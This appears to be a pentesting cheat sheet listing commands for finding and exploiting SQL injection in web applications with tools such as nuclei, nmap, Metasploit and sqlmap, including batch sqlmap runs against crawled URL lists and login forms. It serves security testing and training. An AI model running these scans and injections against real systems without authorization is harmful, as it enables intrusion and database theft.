---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - information-gathering
  - vulnerability-assessment
  - server-side-attack
  - sql-injection
  - blind-sql-injection
  - network-protocols
  - http
  - nuclei
  - nikto
  - metasploit-framework
  - sqlmap
---
# Scanners

## 01 - SQL Syntax Error Detection

### 1.1 - [[Nuclei|Nuclei]]

```
$ nuclei -u <URL> -t ~/nuclei-templates -id php-errors
```

### 1.2 - [[Wapiti|Wapiti]]

```
$ waptiti -u <URL> -m sql
```

### 1.3 - Whatweb

```
$ whatweb -p mySQL-Error,mysql_connect,Microsoft-ODBC-Error <URL>
```

### 1.4 - Metasploit

```
msf > use auxiliary/scanner/http/error_sql_injection

options

set method <GET | POST>

set path /path/to/uri

set rhosts <IP>

run
```

## 02 - URL Endpoints

### 2.1 - Crawl Endpoints

Crawl URLs with parameters.

```
$ katana -list urls.txt -f qurl [-fx] -d 5 -em php,asp,aspx,jsp | httpx -mc 200 -o crawled_urls.txt

$ katana -list urls.txt -f qurl [-fx] -d 5 -ef jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt,js,md | httpx -mc 200 -o crawled_urls.txt
```

### 2.2 - Detect Vulnerable Endpoints

Quickly scan the GET request parameters with `nuclei`.

```
$ nuclei -l crawled_urls.txt -t ~/nuclei-templates -pt http -dast -tags sqli -o sqli-output.txt
```

Using `nmap` to scan multiple targets.

```
$ nmap -p80,443 -Pn -n --script http-sql-injection [--script-args="http-sql-injection.url=<spider/start/path/to/URL>"],http.useragent='<user_agent>' -iL ip_targets.txt
```

Perform SQL Injection on the live targets via GET request parameters.

```
$ sqlmap -m crawled_urls.txt --drop-set-cookie --dbms=mysql --smart --technique=B --batch

$ sqlmap -m crawled_urls.txt --drop-set-cookie --dbms=postgresql --smart --technique=B --batch
```

## 03 - Login and Registration Forms

### 3.1 - Crawl Forms

Crawl URLs with panels or forms.

```
$ katana -silent -u urls.txt -field url -cs login_urls_wordlist.txt | httpx -silent -mc 200 -o crawled_urls.txt
```

### 3.2 - Detect Vulnerable Forms

Perform SQL Injection on the live targets via forms.

```
$ sqlmap -m crawled_urls.txt --drop-set-cookie --forms --dbms=mysql --smart --technique=B --batch

$ sqlmap -m crawled_urls.txt --drop-set-cookie --forms --dbms=postgresql --smart --technique=B --batch
```

## 04 - Vulnerable Web Component

### 4.1 - [[Nuclei|Nuclei]]

```
$ httpx -silent -l url_targets.txt | nuclei -t ~/nuclei-templates -tags sqli -o sqli-output.txt
```

### 4.2 - [[Nikto|Nikto]]

```
$ nikto -host <IP> -Tuning 9a -no404 -Plugins "content_search;tests"
```

TODO: Fill this info

## 05 - SQL Injection Exploits

### 5.1 - [[Wapiti|Wapiti]]

```
$ wapiti -u <URL> -m sql,timesql
```

### 5.2 - Metasploit

```
msf > use auxiliary/scanner/http/blind_sql_query

options

set method <GET | POST>

set path /path/to/uri

set rhosts <IP>

run
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/D - Webapp Pentesting/0x03 - Bypass Webapp Security/Web Application Firewall (WAF)/Helpers/User Agents|Webapp Pentesting: User Agents]]

### Hacking Articles

- [Hacking Articles: Exploiting Sql Injection with Nmap and Sqlmap](https://www.hackingarticles.in/exploiting-sql-injection-nmap-sqlmap/)